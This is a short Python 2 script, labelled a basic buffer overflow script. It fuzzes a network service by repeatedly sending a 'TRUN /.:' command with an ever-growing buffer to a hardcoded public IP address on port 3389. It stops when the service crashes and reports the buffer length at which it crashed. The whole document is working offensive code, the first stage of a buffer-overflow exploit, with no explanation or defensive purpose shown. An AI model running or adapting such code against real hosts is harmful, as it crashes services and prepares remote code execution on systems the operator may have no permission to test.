#basic buffer overflow script
import sys, socket
from time import sleep 

buffer = "$" * 100

while True:
    try:    
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('51.140.189.95', 3389))
        s.send(('TRUN /.:' + buffer))
        s.close()
        sleep(1)
        buffer = buffer + "#" * 100
        print buffer
    except:
        print "Fuzzing crashed at %s bytes" % (str(len(buffer)))
        sys.exit()
